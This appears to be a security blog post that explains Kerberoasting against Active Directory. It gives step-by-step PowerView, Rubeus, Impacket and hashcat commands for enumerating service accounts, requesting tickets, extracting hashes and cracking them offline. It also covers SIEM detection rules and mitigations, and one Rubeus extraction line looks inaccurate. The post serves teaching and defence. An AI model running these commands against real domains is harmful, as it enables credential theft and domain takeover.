---
layout: post
title: "Kerberoasting Attack Deep Dive"
description: "Complete breakdown of Kerberoasting attacks against Active Directory. Learn how attackers extract service account hashes, crack them offline, and gain domain access."
date: 2025-10-02
categories:
  - Research
  - Identity Security
read_time: "15 min"
---

# Kerberoasting Attack Deep Dive

Kerberoasting remains one of the most effective techniques for compromising Active Directory environments. This attack targets service accounts configured with Service Principal Names (SPNs), allowing attackers to request encrypted tickets and crack them offline without triggering alerts.

## Understanding the Attack Vector

### What Makes Kerberoasting Dangerous?

Unlike many Active Directory attacks, Kerberoasting:

- **Requires no elevated privileges** - Any authenticated domain user can perform it
- **Generates minimal noise** - Requests appear as normal Kerberos traffic
- **Enables offline cracking** - Hash extraction and password cracking happen separately
- **Scales effectively** - Can target hundreds of service accounts simultaneously

### The Technical Foundation

Kerberos authentication in Active Directory uses service tickets (TGS) encrypted with the service account's NTLM hash. When a user requests access to a service:

1. The client requests a TGS from the Key Distribution Center (KDC)
2. The KDC encrypts the TGS using the service account's password hash
3. The client receives the encrypted ticket but cannot decrypt it
4. The service account decrypts the ticket using its own hash

Attackers exploit this by requesting TGS tickets for SPN-enabled accounts and extracting the encrypted portion for offline cracking.

## Execution Steps

### Step 1: Reconnaissance

Identify accounts with SPNs configured:

```powershell
# Using PowerView
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Using native AD module
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

Key indicators to analyze:
- Service account naming conventions
- Password last set dates
- Group memberships and privileges
- Associated services and systems

### Step 2: Ticket Request

Request TGS tickets for all discovered SPN accounts:

```powershell
# Using Rubeus
Rubeus.exe kerberoast /output:tickets.kirbi

# Using Impacket (Linux)
impacket-GetUserSPNs domain/user:password -dc-ip 10.0.0.1 -request
```

### Step 3: Hash Extraction

Extract crackable hashes from the tickets:

```powershell
# Rubeus automatic extraction
Rubeus.exe kerberoast /outfile:hashes.txt

# Manual extraction from .kirbi files
Rubeus.exe tgssub /ticket:doIF...kirbi /pwfile:hashes.txt
```

The output format is compatible with Hashcat mode 13100.

### Step 4: Offline Cracking

Crack extracted hashes using Hashcat:

```bash
# Basic cracking with rockyou wordlist
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for enhanced coverage
hashcat -m 13100 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Using mask attack for known patterns
hashcat -m 13100 hashes.txt -a 3 ?l?l?l?l?d?d?d?d
```

## Real-World Case Study

During a recent engagement, we discovered:

| Finding | Impact |
|---------|--------|
| 47 SPN-enabled accounts | Large attack surface |
| 12 accounts cracked in 4 hours | Weak password policies |
| 3 accounts with local admin rights | Lateral movement paths |
| 1 account with domain admin | Full domain compromise |

The critical finding was a SQL service account with a password matching the pattern `Service[Year]!`, which was cracked in under 30 minutes.

## Detection Strategies

### SIEM Rules

Monitor for anomalous Kerberos TGS requests:

```
EventID: 4769
ServiceName: *$*
FailureCode: 0x0
EncryptionType: 0x17 (RC4_HMAC)
```

Key detection points:
- Unusual volume of TGS requests from single source
- Requests for multiple SPN accounts in short timeframe
- RC4 encryption type usage (indicates older/lower security)
- Requests outside normal business hours

### Behavioral Indicators

Watch for these patterns:
- Service accounts accessing unusual resources after ticket requests
- Multiple failed logon attempts following successful cracks
- New administrative activity from previously non-admin accounts
- PowerShell or tool execution on service account-associated systems

## Mitigation Recommendations

### Immediate Actions

1. **Audit all SPN accounts** - Document purpose and ownership
2. **Enforce strong passwords** - Minimum 25 characters for service accounts
3. **Implement GMSA** - Use Group Managed Service Accounts where possible
4. **Disable RC4** - Force AES encryption for Kerberos tickets

### Long-term Improvements

```powershell
# Enable advanced auditing
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# Deploy LAPS for local admin accounts
Install-WindowsFeature RSAT-AD-AdminCenter
```

### Architecture Controls

- **Tiered Administration Model** - Separate privileged accounts by tier
- **Just-In-Time Access** - Time-limited privilege elevation
- **Network Segmentation** - Limit service account reachability
- **Regular Password Rotation** - Automated rotation for service accounts

## Advanced Techniques

### Kerberoasting with Constrained Delegation

When combined with constrained delegation misconfigurations, cracked service accounts can enable lateral movement to specific targets.

### Cross-Domain Kerberoasting

In multi-domain forests, service accounts trusted across domains expand the attack surface significantly.

### Golden Ticket Prevention

While Kerberoasting doesn't directly enable Golden Ticket attacks, compromised service accounts with high privileges can be stepping stones to DCSync operations.

## Conclusion

Kerberoasting remains a critical threat due to its low detection profile and high success rate against poorly configured environments. Organizations must implement comprehensive monitoring, enforce strong service account password policies, and regularly audit SPN configurations.

The combination of technical controls, behavioral monitoring, and architectural improvements provides defense-in-depth against this persistent threat.

---

*Next article: We'll cover AS-REP Roasting and how it complements Kerberoasting in Active Directory assessments.*
